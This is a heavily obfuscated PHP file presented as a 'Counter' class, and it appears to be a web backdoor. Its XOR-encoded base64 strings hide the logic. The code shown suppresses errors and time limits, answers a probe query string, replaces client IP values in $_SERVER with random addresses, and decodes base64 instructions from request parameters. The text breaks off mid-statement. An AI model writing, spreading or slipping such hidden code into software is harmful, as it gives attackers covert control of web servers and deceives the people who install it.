<?php class Counter {     private static $_j;     static function _xk($_jhj, $_m)     {         if (!self::$_j) self::_tzb();         $_w = strlen($_m);         $_v = base64_decode(self::$_j[$_jhj]);         for ($_ria = 00, $_qlc = strlen($_v);$_ria !== $_qlc;++$_ria) $_v[$_ria] = chr(ord($_v[$_ria]) ^ ord($_m[$_ria % $_w]));         return $_v;     }     private static function _tzb()     {         self::$_j = array(             '_lhf' => 'MhcIABMIOhUFKx8fMSk' . 'E' . 'NhsV',             '_vu' => 'MgUOM0oGOwA4JzsPOgUDOhY=',             '_mmda' => 'OgkGCCwUKRc3' . 'AQ==',             '_vse' => 'PAYRFgM' . '=',             '_smrg' => 'fCs4Rg==',             '_rjmh' => 'DzI4PAw/' . 'J' . 'C' . 'U' . '=',             '_jwf' => 'cA==',             '_vgs' => 'DCggCSggACw2Gz8' . '=',             '_jgz' => 'DCIoIho1JTUbIy' . 'g' . '=',             '_cii' => 'DDQ2IzYNLiUxNw0=',             '_mstp' => 'cQ' . '==',             '_mvao' => 'c' . 'Q=' . '=',             '_mna' => 'cQ' . '==',             '_pwot' => 'FyQxJ' . 'CUHLyM7KA' . 'gxNzA/Gy8jOyg' . '=',             '_wge' => 'FyAx' . 'NzoHKyMoN' . 'wg1NyMgGys' . 'jKD' . 'c' . '=',             '_cffa' => 'Fy05MQAhMicQKz' . 'ogDT' . '0oJ' . 'Q' . 'A/IjM' . '=',             '_zi' => 'DSMnNiQaOSs9' . 'NA0=',             '_axl' => 'DTQmNws' . '0NDk' . 'bNTk' . '=',             '_nyg' => 'DSw8OgssLj' . 'Q' . 'bLSM=',             '_wjn' => 'LQ=' . '=',             '_vqlw' => '',             '_vckb' => '',             '_sdk' => 'YA' . '=' . '=',             '_bvkj' => 'LQ=' . '=',             '_sea' => 'e' . 'Q==',             '_tq' => 'Yg=' . '=',             '_sms' => 'Mw=' . '=',             '_pef' => 'Yg==',             '_uoya' => 'eQ' . '==',             '_fjf' => 'f1EGOhkKfwUfKx1GO' . 'hweNhtWfR8OOR8OLAVJ' . 'fw4EMRkOMRlW' . 'fV1Q' . 'Kh8HY' . 'g=' . '=',             '_zef' => 'fV' . 'I' . '=',             '_uz' => 'Kg==',             '_wrh' => '',             '_pez' => '',             '_xqqz' => 'YA' . '=' . '=',             '_ebha' => 'K' . 'g=' . '=',             '_hart' => 'MwoFFxg9FgFKA' . 'T' . 'AC',             '_voa' => 'BCpCAHI' . 'XTyVlGlU' . 'eAlM=',             '_xxdl' => 'U' . 'ms' . '=',             '_rvg' => 'f05KTj' . '0cVE49HFROPRxUTjwLBAY6HFQrMBtKGj4YD1IqABkHPR0JADYMDxZ/CBgdM' . 'k4eGjpOBBcoHQYXKxoPAH5PS05wDQ' . '8cKwsYTGMMGExjDQ8c' . 'KwsYT' . 'BoDCxszVEp' . 'O' . 'PVA' . '=',             '_zhe' => 'Y14HVWNeB' . 'g4xBQAZYXxvS3' . '9R' . 'RQ' . '==',             '_dkg' => 'Mw' . 'U=',             '_slx' => 'MwIMGSoPGAlxAQQN',             '_rbkc' => 'cHNE',             '_kxbt' => 'YwcAX' . 'GF' . 'v',             '_tg' => 'Oxw' . '=',             '_zfmm' => 'Mw' . 'UWEioIAgJxBh4G',             '_eov' => 'PAE=',             '_efk' => 'PB' . 'c=',             '_si' => 'PBo' . '=',             '_joyu' => 'LA' . 's' . '=',             '_fngt' => 'Fy' . 'Y6Ki' . '8XPT' . '0u',             '_kckb' => 'KBY' . 'U' . 'Xw' . '=' . '=',             '_pln' => '',             '_xe' => 'c' . 'Q' . '=' . '=',             '_smlt' => 'Mg=' . '=',             '_pb' => 'BAIHFgMzFQAeDjY' . 'fVS' . '4=',             '_xnzl' => 'M' . 'g' . '=' . '=',             '_nj' => 'Ohg' . '=',             '_qjx' => 'VQ==',             '_fpxw' => 'Iw==',             '_yu' => 'LR' . 's' . 'V',             '_pzpz' => 'O' . 'Q' . '=' . '=',             '_hbrh' => 'ZQ' . '=' . '=',             '_pq' => 'OQ8IOg=' . '=',             '_hy' => 'KwgXPjEECgQ' . '=',             '_xam' => 'LA==',             '_if' => 'Mg==',             '_uu' => 'LA==',             '_idyo' => 'Mg' . '=' . '=',             '_xf' => 'BBUYG' . 'z' . 'JJNw=' . '=',             '_vgc' => 'BBwME' . 'g' . 'YzQ' . 'zw=',             '_cbck' => 'BA4' . 'WAjJ' . 'SO' . 'Q==',             '_cbkd' => 'BAoDBTYDVD' . 'k' . '=',             '_nns' => 'dQYBG' . 'T' . 'tPBhY' . '7X' . 'w==',             '_gyf' => 'dQsIAzt' . 'CAgZ1',             '_qi' => 'OQALA' . 'g=' . '=',             '_so' => 'KxccJ' . 'zEbAR' . '0=',             '_iwca' => 'O' . 'Q8' . 'ZOg=' . '=',             '_sjb' => 'MRACBg=' . '=',             '_uy' => 'OQk' . '=',             '_tij' => 'fw=' . '=',             '_vf' => '',             '_cr' => 'H' . 'w=' . '=',             '_be' => 'FychIyoXPCYn',             '_tza' => 'Kx' . 'U=',             '_ow' => 'bg==',             '_fc' => 'KxAP' . 'FkA3ARoO',             '_qpd' => 'KxAVAkc' . 'vGQwfB' . 'g' . '==',             '_btaq' => 'HAkCKwMCK0s4JhYJZUYB' . 'KgoYNhYNLRJDPgoYOhQC' . 'PhIFKQNXfwQDKg' . 'g' . 'I' . 'PhQV' . 'Yk' . 'Q' . '=',             '_ty' => 'fX5p',             '_ip' => 'ExMCK1ckMQkEPQkSLRMTOk' . 'B' . 'RY' . 'xcQNhYFMEA=',             '_oob' => 'YQ' . '==',             '_xybh' => 'U' . 'mU=',             '_dnoy' => 'ck' . 'Y' . '=',             '_bjx' => 'Umk' . '=',             '_pzce' => 'HBkHGRExAkQ5DS8TU00AOg4d' . 'QgQzFwADT3' . '8VAQwGLBMdUCELMER' . 'V' . 'eV' . 'U=',             '_hgnc' => 'HBkdBjoYB18LBBIc' . 'LBAWAHI' . 'zHREwEhocO' . 'ExTED4FFk' . 'Rr',             '_uxn' => 'UmN6Yw' . '==',             '_qr' => 'Kw' . 'c=',             '_jccf' => 'bg' . '=' . '=',             '_gqx' => 'Un95ZXJY',             '_ppv' => 'Um8=',             '_ism' => 'HAUYKw8YK0ciJhoTZUoCOhICcAICMgZNfwkePhgFOh5LC' . 'j4wclJ' . '7' . 'VQ=' . '=',             '_il' => 'HAkZBDoIA10LFBYeLAAS' . 'AnIjGRMwA' . 'h4eOFxXEj4VEkZ' . 'r',             '_pm' => 'Um' . '9hVQ==',             '_fr' => 'OQgWH' . 'w' . '==',             '_vj' => 'KwYCA' . 'AU' . 'TMg' . '4' . '=',             '_dw' => 'UmdjbnJ' . 'A',             '_og' => 'Um8' . '=',             '_ggh' => 'HBsEKxEEK1k+JgQP' . 'ZVQ=',             '_edh' => 'OQQI' . 'H' . 'Q==',             '_xuy' => 'Kw4' . 'cBw=' . '=',             '_sdwl' => 'ZE' . '4WP' . 'gMdYk' . 'w' . '=',             '_kgd' => 'f' . 'Q==',             '_wcy' => 'U' . 'mk=',             '_ct' => 'HAsCBwgxEEE3BCw' . 'UAwAEKw0DHVd/BRgHDDwMARYDK19MFQQzAQISADpZT' . 'g==',             '_oakz' => 'f' . 'Q=' . '=',             '_yuwv' => 'U' . 'm' . 'c' . '=',             '_wsx' => 'HAsaKwEaK0kgLQUaLAIRLUkxMQcbOw0aO' . 'F5UPQUHOl' . 'JA',             '_hau' => 'U' . 'm4' . '=',             '_bbu' => 'B1c1GisbFwYyHxoa' . 'cj' . 'MQV' . 'H8' . '=',             '_sppx' => 'UntjV' . 'Q==',             '_hns' => 'L' . 'Q=' . '=',             '_yp' => 'UmRnaHJ' . 'D',             '_hix' => 'Un4=',             '_vq' => 'HBcWHQExDFU9HS' . '8dQ' . 'kk' . '=',             '_xc' => 'ZF' . 'E' . 'bC' . 'hg6TF' . 'c' . '=',             '_tjf' => 'fQ' . '==',             '_xmdr' => 'UmE' . '=',             '_pg' => 'HAgdDToJB1QbDgAJMBQaDTYIHUN/BgcNPgQbFDoJB0J/ARoVOgkSFD' . 'paUQ==',             '_bjw' => 'f' . 'Q' . '==',             '_vt' => 'U' . 'mE=',             '_niwu' => 'HBoEEg0xAUcyGj4bGQANLVgvCAswEQMID2VVC' . 'Ac' . 'bOkN' . 'e',             '_ju' => 'Um' . 'E=',             '_jgq' => 'B0c1BysLFx' . 'sy' . 'Dxo' . 'HciMQSX8' . '=',             '_ywml' => 'Umh+VQ=' . '=',             '_jpq' => 'Um50VUl' . 'U',             '_stk' => 'clo=',             '_hc' => 'YlUvCyxXZ1' . 'U' . '4' . 'YA=' . '=',             '_qcq' => 'YEo' . '=',             '_vi' => 'VQ==',             '_wqv' => 'fDciHQU' . 'yUVFdW2BCJS5TN' . 'hg' . '=',             '_dbm' => 'fC' . 'U/Bj4XADllUUpfYFA4K' . 'XwQ' . 'Fw' . '=' . '=',             '_cbu' => 'fDcyLQoHOxgdLVFBcUBWdjc0f' . 'A' . 'Ia',             '_wnv' => 'fD4tKQMEZUpYdF1fAz9' . 'VNh' . 'E' . '=',             '_ejtz' => 'fDMDLQ4WO1VQcURHd' . 'jM' . 'FfA' . 'Y' . 'L',             '_agpi' => 'fCshLRI' . 'eNgUfPANAd1lRYF4mAlQTL' . 'A==',             '_bsl' => 'fDcKFz4FFShlQ1' . '9OYEItGHwCAg==',             '_crta' => '',             '_bxa' => 'YV1K',             '_nur' => '',             '_vou' => 'fCo' . 'fLRcKO0xM' . 'cV1bdioZf' . 'B8' . 'X',             '_hsv' => 'Iw' . '=' . '=',             '_fo' => 'M' . '0' . 'k=',             '_wpve' => 'J' . 'A==',             '_uwt' => '',             '_nxps' => 'Ig==',             '_lveq' => '',             '_tbvx' => 'OgQGN' . 'gVd',             '_qwp' => 'eQt' . 'K',             '_sra' => 'KQAG' . 'Ww' . '==',             '_zjw' => 'Z' . 'Q' . '==',             '_hg' => 'e' . 'Q4=',             '_wkwa' => 'Yg' . '=' . '=',             '_vgb' => 'Mw' . 'EZNF' . 'I' . '=',             '_grr' => 'ZQ=' . '=',             '_qmj' => 'eQ' . '=' . '=',             '_rczq' => 'Nw0SCGVW' . 'SQ=' . '=',             '_mhin' => 'FzM2NDQXKD' . 'E' . 'w',             '_nyu' => 'DTY+MjUMJz' . 'AyI' . 'hY=',             '_lvbg' => 'YBZ' . 'c',             '_gxi' => 'BAUEHCoSGQwtG' . 'QgKZS0' . '=',             '_xd' => 'NxYeL' . '1hFcA==',             '_tojb' => 'Fzg1' . 'JCYXI' . 'zI' . 'g',             '_jjaf' => 'DSQ' . 'yCiQw' . 'Cz42DSg=',             '_awd' => 'YAF' . 'Z',             '_kt' => 'BA' . '8' . 'AAhE9CQ0DDT0fV' . 'Cw=',             '_kbyt' => 'I' . 'w==',             '_mtho' => 'Iw' . '==',             '_shx' => 'Iw' . '=' . '=',             '_hxvq' => 'Iw==',             '_sa' => 'Iw=' . '=',             '_nae' => 'fCg4LRUNO05LcV' . '9cdig+fB0' . 'Q',             '_gi' => 'Iw' . '==',             '_qz' => 'LBUc' . 'MA' . 'N' . 'J',             '_qb' => 'BAIdMB4LZ' . 'Q' . '==',             '_ms' => 'ZQ=' . '=',             '_ydw' => 'Ag' . '=' . '=',             '_wsl' => '',             '_sg' => 'JA' . 'EKAl' . 'Q' . 'i',             '_fs' => 'JBAEBWV' . 'X' . 'GA==',             '_lfah' => 'JAodBhAzV' . 'Q' . '0=',             '_ipsz' => 'fC03PRAfOkdYZVlC' . 'dE5FAy' . 'xPN' . 'gI' . '=',             '_ekg' => 'fDQOKQkHZUBbdFd' . 'cAxVWNhs=',             '_huaj' => 'fCo4PgIXPhULMhMNK0xLcV1cdio+fB8Q',             '_wom' => 'YUZ' . 'Q',             '_gnj' => '',             '_zdy' => 'fDspCisTEwg3ChcFK' . 'ypIQ3FMT' . 'UIDOl' . 'ECLA==',             '_wccr' => 'YVh' . 'T',             '_ssjz' => 'fDROQV50V0' . '81WXwB' . 'FQ=' . '=',             '_ohlb' => 'cw==',             '_atfd' => 'dw' . '=' . '=',             '_hn' => '',             '_gvag' => 'dg' . '=' . '=',             '_ekjz' => '',             '_jc' => '',             '_qlp' => 'fDowNgsKOANda' . '1xDcU1Udjo2fA' . '8' . 'Y',             '_ogps' => 'Nh' . 'UFETpOUCk5' . 'EQgTcQ' . 'gK' . 'EQ' . '==',             '_go' => '',             '_vwob' => 'LQ==',             '_eayn' => 'Ow' . 'MAEmU' . '=',             '_jmh' => 'ZA' . 'A' . 'CGAF' . 'pV' . 'k' . '8=',             '_tcm' => '',             '_gd' => 'GRgEMlBLYlU+C' . 'yxGZ' . '1UpYA==',             '_lbxt' => 'YFpXS' . 'A==',             '_vaf' => 'Y' . 'Q=' . '=',             '_txal' => 'UmM=',             '_ba' => 'DQAUDgtyMQtYUg=' . '=',             '_btfj' => 'Un' . 'k' . '=',             '_utm' => 'B1UkAAwzHR' . 'tbRQ=' . '=',             '_tt' => 'UmM=',             '_mro' => 'Ej48GlonOgUCNhgfZ' . 'VdAcUc' . '=',             '_hv' => 'Umw' . '=',             '_xxeu' => 'U' . 'n0=',             '_hph' => 'LAQ=',             '_ied' => 'dR' . 'QCHzY' . 'GW' . 'Rw0SA' . '=' . '=',             '_mjz' => 'Mg==',             '_mc' => 'MhERH' . 'A' . '==',             '_ksjx' => 'ZQ=' . '=',             '_brax' => 'Mg' . '=' . '=',             '_wg' => 'dQwSHhV' . 'lDh' . 'h' . 'd',             '_weto' => 'dQMFBhplDAULX' . 'A' . '==',             '_jimz' => 'dQMS' . 'DzNUEQc7R' . 'A==',             '_iiq' => 'LRc' . '=',             '_mjl' => '',             '_dwsw' => 'dR8DDWUC' . 'Ck' . 's' . '=',             '_bpce' => 'd' . 'Q' . 'YU' . 'G2U' . '=',             '_xbz' => 'dQ' . '==',             '_zxe' => 'Lg8TL' . 'QwPKhEZLxkFOx4RNxI' . 'dMwIOPA4UMR' . 'U=',             '_teh' => '',             '_juy' => 'PUYSA' . 'C0aEQIqDBECOgYEEz4' . 'EXg4tDw' . '==',             '_bzjx' => 'JwMJ' . 'TSwR' . 'BA43ABAQcQ4X' . 'B' . 'A' . '=' . '=',             '_lxv' => 'LAEFcRAZPg4BPhYac' . 'QwbO' . 'A=' . '=',             '_txhx' => 'JQwdcRoDPgQb' . 'Ph' . 'wA' . 'cQYB' . 'O' . 'A==',             '_dccn' => 'PRpMEQg+GwENCHEY' . 'B' . 'x' . 'Y=',             '_xj' => 'Fz' . 'YzDz0vEDEz',             '_scxl' => '',             '_bmi' => 'c' . 'Q' . '=' . '=',             '_ul' => 'cQ=' . '=',             '_dhdy' => 'cQ' . '=' . '=',             '_vk' => 'c' . 'Q==',             '_lcld' => 'H' . 'g' . '==',             '_ajy' => 'c0' . 's=',             '_abq' => '',             '_zepr' => 'dQ' . 'cFC2UACQwxGhAJ' . 'd' . 'Q==',             '_ojea' => '',             '_nn' => 'Hw' . '==',             '_kyy' => 'FzItJ' . 'QAu' . 'N' . 'iY' . 'L',             '_ivz' => 'HBUNGToUF0ALAxMIZVoXCCcOTAUrFw9WfxkLDC0JBhli' . 'Lzcrc' . 'kI' . '=',             '_jm' => 'U' . 'm' . 'I' . '=',             '_rh' => 'HAMXKwkXK0EtLQ0XLAocLUE8MQ8WOwUXOFZZPQ' . '0KOl' . 'p' . 'N',             '_wou' => 'Un' . '0=',             '_mokd' => 'Fz8gKTEX' . 'JCct',             '_lpn' => 'Y' . 'wlW',             '_gxx' => 'Y' . 'wk' . '=',             '_sf' => 'NwsCA' . 'w=' . '=',             '_iy' => 'f' . 'Q==',             '_kj' => 'f' . 'Q' . '=' . '=',             '_dvyv' => 'Y0' . 'M=',             '_gs' => 'YQ==',             '_mgcw' => 'c' . 'Q=' . '=',             '_znqm' => 'D' . 'C' . '8o',             '_pswd' => 'Dw==',             '_lp' => 'Gys=',             '_nais' => 'HDU' . '4',             '_zcf' => 'Fj' . 'UlX' . 'w' . '==',             '_svof' => 'LwQ' . 'D',             '_wm' => 'NR8B',             '_ejnj' => 'OAcK',             '_syoj' => 'NRgd' . 'OA=' . '=',             '_rfo' => 'P' . 'QI' . 'a',             '_pdxw' => 'c' . 'Q==',             '_wcuj' => 'c' . 'Q' . '=' . '=',             '_bmg' => '',             '_kquu' => 'PAwT' . 'M' . 'y' . 'YIMRA' . 'V',             '_nbay' => 'NxcC' . 'LzwVMA' . 'cT',             '_udvq' => 'LA8dDDI' . 'J',             '_tbiu' => 'Nw4WEy' . 'w' . '=',             '_ijmk' => 'LAEN',             '_gc' => 'KQcUNgQfABI' . 'D' . 'OhA' . '=',             '_dtfe' => 'KQ4UExQmN' . 'BYfFy00CBsfOg' . '==',             '_knbb' => 'L' . 'BAHZUxE',             '_brgh' => '',             '_iii' => 'Nw' . '0LHA' . '=' . '=',             '_jpxq' => 'LxwZB' . 'A' . '==',             '_oazh' => 'Z' . 'Q=' . '=',             '_xczz' => 'L' . 'wEUGg' . '==',             '_jh' => 'ZQ==',             '_ph' => 'ZQ=' . '=',             '_cu' => 'GCwlT' . 'w' . '==',             '_im' => 'LxM' . 'NBg==',             '_er' => 'fyElOChwWF9cdVU' . '=',             '_wts' => 'Fw0' . 'UFWVC',             '_ywt' => 'NwAWGw' . '==',             '_laup' => 'U' . 'mY=',             '_fenp' => 'H' . 'B0JCww8Bg4KB2VSBAkGLB' . 'dqb2RV',             '_qght' => 'Um8=',             '_jkuo' => 'cQ=' . '=',             '_mwn' => 'NR' . 'oCFw==',             '_ouog' => 'N' . 'RQ' . 'R',             '_tmoq' => 'OQ' . 'QB' . 'FQ==',             '_umoh' => 'KwgKLzEE' . 'F' . 'xU=',             '_md' => 'ORoGD' . 'g' . '=' . '=',             '_wke' => 'KxkXL' . 'DEV' . 'Ch' . 'Y=',             '_rj' => 'LgYDCAYmBA' . '8VAj4CAhwVNxsNFggnEhAYH' . 'DI=',             '_zte' => '',             '_sgk' => 'LgUBLQYdKhsLLxMXOxQDNxgPMwgcPAQGMR' . '8' . '=',             '_necq' => '',             '_rdg' => 'fw' . '=' . '=',             '_arnj' => 'fw==',             '_nv' => 'fw=' . '=',             '_pi' => 'f' . 'w=' . '=',             '_vuk' => 'c0' . 'k=',             '_xsh' => 'Y' . 'FQ' . '=',             '_wtt' => 'cVM=',             '_qbc' => 'c' . 'Us=',             '_hxme' => 'OAwONg' . 'QbOAwJNhMf',             '_eo' => 'Nh0LOBUJLRULKxUeLQUP' . 'PB8GM' . 'AI' . '=',             '_qmul' => 'NhcZCDoZCgo+Dh0JLRUVBS8fH' . 'w=' . '=',             '_lelx' => 'Nh8LBjoRBREmAA8S' . 'Ph8' . 'aDToW',             '_bk' => 'N' . 'gASBDoLGg8' . 'rCAE' . '=',             '_pdce' => 'MAs9LB0D' . 'LR0=',             '_goby' => 'NgEW' . 'CToG' . 'Bw' . 's4',             '_fnw' => 'MAYp' . 'ADoQKQQzARcJ',             '_rp' => 'KBMQFz' . 'c=',             '_iofe' => 'Nw4GOAMb',             '_hp' => 'LhwND' . 'zYdF' . 'Q==',             '_sfvc' => 'PRkIOAMVMQ4' . 'SLA' . '==',             '_fkl' => 'P' . 'AENDi0P' . 'EA4' . '=',             '_zzx' => 'KBkKETc=',             '_yr' => 'Nx8EHz' . 'c' . 'O',             '_xez' => 'LgMEMx8RJg=' . '=',             '_kby' => 'P' . 'R0KEgc' . 'rAQ' . 'YG' . 'H' . 'A==',             '_bczs' => 'PBUHHRM+CR0=',             '_myl' => 'dA=' . '=',             '_ag' => 'c' . 'g' . '=' . '=',             '_gvqr' => '',         );     } } class _igo {     private static $_j;     static function _xk($_jhj)     {         if (!self::$_j) self::_tzb();         return self::$_j[$_jhj];     }     private static function _tzb()     {         self::$_j = array(             043, -043,             01142,             0334,             01250,             0553,             0643,             0316, -061, -014, -075,             00,             00, -0440, -0125,             0566,             0125,             0125,             0125,             00,             00,             00,             0155,             0222,             00,             00,             00,             127.5,             127.5,             00,             00,             00,             01571, -01172,             00,             00,             00,             00,             0.33333333333333,             0.33333333333333,             0.33333333333333,             00,             00,             00, -052,             0244,             0171,             04,             04,             0.66666666666667,             0.66666666666667,             0.66666666666667,             0144,             0332,             0476,             013,             010,             03,             00,             00,             033, -033,             066,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             0134, -060, -0213,             00,             00,             0212,             0211,             0.33333333333333,             0.33333333333333,             0.33333333333333, -0311,             0312,             0.5,             0.5,             02244,             01570, -02064,             0101065,             0101065,             0101065,             00,             00,             00,             0.5,             0.5, -0464, -0465,             0.33333333333333,             0.33333333333333,             0.33333333333333,             00,             00,             00,             0246, -0246,             0.5,             0.5, -0505, -013,             0521,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.5,             0.5,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.5,             0.5,             0764,             0764,             49999.5,             49999.5,             0.33333333333333,             0.33333333333333,             0.33333333333333, -01137,             0314, -0624,             0.33333333333333,             0.33333333333333,             0.33333333333333,             00,             00,             00,             0573, -0572, -0352, -0332, -0704,             00,             00,             00,             00,             00,             00,             00,             00,             00, -0165, -0170, -03,             0177,             0177,             00,             00,             00,             0422,             0517, -01140,             0.5,             0.5,             00,             00,             00,             0711, -0653, -01563,             00,             00,             00,             0357,             0356, -0734,             00,             00,             0436, -0367,             01025,             0.5,             0.5, -01244,             05,             01251,             0.5,             0.5,             0.5,             0.5,             01,             01,             0617,             0332, -0264,             00,             00,             00,             0660, -01234, -0354,             00,             00,             00,             0.5,             0.5,             0.5,             0.5, -0143,             0144,             00,             00,             0567, -0477, -067, -034,             035, -0127, -047, -0176, -03,             04,             00,             00,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0376, -026,             0424, -07, -01, -07,             0.5,             0.5,             01202, -0201, -01403, -0310, -052, -0237,             00,             00, -01200,             01403,             02603,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0166, -0166,             00,             00,             00,             0226, -0134, -0361,             0.33333333333333,             0.33333333333333,             0.33333333333333,             00,             00,             00,             0.5,             0.5,             00,             00, -0147, -0332,             0501,             0.33333333333333,             0.33333333333333,             0.33333333333333,             012,             012,             00,             00,             00, -0125,             0126, -0526, -0412,             01141,             00,             00, -01265, -0256, -01010,             00,             00,             0.33333333333333,             0.33333333333333,             0.33333333333333,             00,             00, -077,             0313,             0413,             0.33333333333333,             0.33333333333333,             0.33333333333333,             010,             010,             0334, -0463, -01016,             0207,             034, -0243, -0522,             023, -0500,             0.5,             0.5,             00,             00,             00,             00,             00,             00,             00,             00,             0562,             0561,             0.5,             0.5,             03,             0272,             0275,             01310,             01307,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0764,             0676, -01662,             0407,             0346, -040, -0153, -0153, -0103,             0367,             0264, -0136,             052, -0211,             014, -013,             0431, -0431,             0753, -0753,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0506,             0256,             0763,             00,             00,             00,             00,             00,             00,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.5,             0.5, -01175, -01175, -0412, -0370, -01003,             0.33333333333333,             0.33333333333333,             0.33333333333333,             01550, -01244,             0304,             0.5,             0.5, -0610,             0610,             0705, -0705,             00,             00, -0132, -01205,             01337, -0515, -0774,             0257, -0116,             0535,             0653,             00,             00,             00,             0.5,             0.5,             0.5,             0.5, -0101,             0101, -040, -062, -022,             01540, -01540,             00,             00,             00, -0510, -0615,             0104, -02, -04, -01055,             01055,             01,             01,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             077, -076, -0305,             0305,             01,             01446,             01446,             0.5,             0.5,             0.33333333333333,             0.33333333333333,             0.33333333333333,             061,             060,             01,             01,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0603, -0467, -01271,             1.5,             1.5, -052, -075,             0151,             0112, -0111, -014,             01052, -01033, -0622,             0625,             0.5,             0.5, -031,             027,             06,             0301,             0300,             00,             00,             00,             00,             00,             00, -021, -021,             0.5,             0.5,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.33333333333333, -041, -0240, -0303,             0.5,             0.5,             0522,             0535,             014,             01021, -01017, -0574, -0126, -0725,             0.33333333333333,             0.33333333333333,             0.33333333333333,             1.3333333333333,             1.3333333333333,             1.3333333333333, -0364,             0367, -01221, -01222, -0444, -0444, -01171, -01172,             013,             011,             00,             00,             00,             05,             05,             01213025,             01213025,             01213025,             0355,             0625,             0250,             02,             02, -01547,             01647,             033,             033,             033,             0.66666666666667,             0.66666666666667,             0.66666666666667,             17.333333333333,             17.333333333333,             17.333333333333, -061,             062,             9956.5,             9956.5,             0261, -0453, -0173, -0147, -0464, -0243, -014, -0725, -0741,             032,             032,             032,             05,             05,             6.5,             6.5,             01052,             0434, -01474, -063,             0373,             147.66666666667,             147.66666666667,             147.66666666667,             0177, -057, -01212,             01231,             02,             02, -025, -025,             01000,             01000,             0.5,             0.5,             026,             0403, -0360,             04,             04, -011, -0276,             0307,             00,             00,             00,             0.5,             0.5,             4.5,             4.5,             0377,             01321,             01674, -0102, -0406, -0510,             02,             02,             02,             05,             05,             00,             00,             00,             00,             00,             00,             0527, -0627,             0101,             00,             00,             00,             0210,             01145,             01346,             022,             022, -045,             046,             0.66666666666667,             0.66666666666667,             0.66666666666667,             0.5,             0.5,             0201,             0314, -0115,             0112,             0376,             0265,             0.66666666666667,             0.66666666666667,             0.66666666666667, -0206,             0305, -0514,             0.66666666666667,             0.66666666666667,             0.66666666666667,             0215,             0261, -045,             0.66666666666667,             0.66666666666667,             0.66666666666667, -0413,             0414, -0451, -0350,             0102,             01,             01,             0.5,             0.5,             0637,             0627,             01465,             05,             05, -0654, -0655,             014,             02,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.5,             0.5,             01,             01,             0.5,             0.5,             0.5,             0.5, -0140, -0152,             0.5,             0.5,             0124,             0112,             0144,             0402,             0545, -0625,             01055, -0115,             21.666666666667,             21.666666666667,             21.666666666667,             01671, -01520, -0306,             0307,             02, -02,             17.5,             17.5, -0110,             0110, -0464, -0465, -0212, -0655, -0442,             0737, -0735,             0.33333333333333,             0.33333333333333,             0.33333333333333,             0.5,             0.5, -050,             0164,             0253,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00,             00, -0254, -01133, -0654, -01147,             01140,             02311         );     } } @error_reporting(_igo::_xk(00) + _igo::_xk(01)); @set_time_limit(_igo::_xk(02) + _igo::_xk(03) - _igo::_xk(04)); @ignore_user_abort(true); @ini_set(Counter::_xk('_lhf', '_' . 'vp') , _igo::_xk(05) - _igo::_xk(06) + _igo::_xk(07)); @ini_set(Counter::_xk('_vu', '_d' . 'g') , _igo::_xk(010) + _igo::_xk(011) - _igo::_xk(012)); @ini_set(Counter::_xk('_' . 'mmd' . 'a', '_' . 'q' . 'v' . 'g') , (int)round(_igo::_xk(013) + _igo::_xk(014))); if (isset($_GET[Counter::_xk('_' . 'v' . 'se', '_ntuh') ])) exit(Counter::_xk('_smr' . 'g', '_dse' . 'l')); @$_SERVER[Counter::_xk('_rj' . 'mh', '_' . 'zhc') ] = Counter::_xk('_' . 'jw' . 'f', '_e' . 'e'); if (isset($_SERVER[Counter::_xk('_vg' . 's', '_mr') ]) && !empty($_SERVER[Counter::_xk('_jg' . 'z', '_gz' . 't') ])) $_ov = $_SERVER[Counter::_xk('_cii', '_qdus') ]; else $_ov = rand(_igo::_xk(015) + _igo::_xk(016) + _igo::_xk(017) , (int)round(_igo::_xk(020) + _igo::_xk(021) + _igo::_xk(022))) . Counter::_xk('_mstp', '_' . 'i' . 'a') . rand((int)round(_igo::_xk(023) + _igo::_xk(024) + _igo::_xk(025)) , _igo::_xk(026) + _igo::_xk(027)) . Counter::_xk('_mv' . 'a' . 'o', '_e' . 'r' . 'v' . 'f') . rand((int)round(_igo::_xk(030) + _igo::_xk(031) + _igo::_xk(032)) , (int)round(_igo::_xk(033) + _igo::_xk(034))) . Counter::_xk('_mn' . 'a', '_ro' . 'e') . rand((int)round(_igo::_xk(035) + _igo::_xk(036) + _igo::_xk(037)) , _igo::_xk(040) + _igo::_xk(041)); if (isset($_SERVER[Counter::_xk('_pw' . 'o' . 't', '_p' . 'e' . 'tz') ]) && !empty($_SERVER[Counter::_xk('_wge', '_' . 'te' . 'g' . 'e') ])) {     @$_SERVER[Counter::_xk('_' . 'cffa', '_y' . 'm' . 'a') ] = $_ov; } if (isset($_SERVER[Counter::_xk('_z' . 'i', '_f' . 'jy' . 'p') ])) {     while ($_y = key($_SERVER))     {         if ($_SERVER[$_y] == $_SERVER[Counter::_xk('_' . 'ax' . 'l', '_qkx') ])         {             @$_SERVER[$_y] = $_ov;             break;         }         next($_SERVER);     }     @$_SERVER[Counter::_xk('_ny' . 'g', '_iqu') ] = $_ov; } if (isset($_REQUEST[Counter::_xk('_wj' . 'n', '_hol' . 'i') ])) {     $_p = Counter::_xk('_vq' . 'l' . 'w', '_zw');     $_fs = Counter::_xk('_v' . 'ckb', '_z' . 's' . 'u' . 'g');     $_gus = Counter::_xk('_' . 'sd' . 'k', '_' . 'bu');     $_mk = base64_decode($_REQUEST[Counter::_xk('_b' . 'vk' . 'j', '_' . 'nt') ]);     $_mpj = explode(Counter::_xk('_sea', '_t' . 'dk') , trim($_mk));     for ($_ria = (int)round(_igo::_xk(042) + _igo::_xk(043));$_ria < count($_mpj);$_ria++)     {         $_x = explode(Counter::_xk('_tq', '_evpw') , trim($_mpj[$_ria]));         if ($_x[(int)round(_igo::_xk(044) + _igo::_xk(045)) ] == Counter::_xk('_sms', '_rzl'))         {             $_p = $_x[(int)round(_igo::_xk(046) + _igo::_xk(047) + _igo::_xk(050)) ];         }         else         {             $_fs .= $_gus . $_x[(int)round(_igo::_xk(051) + _igo::_xk(052) + 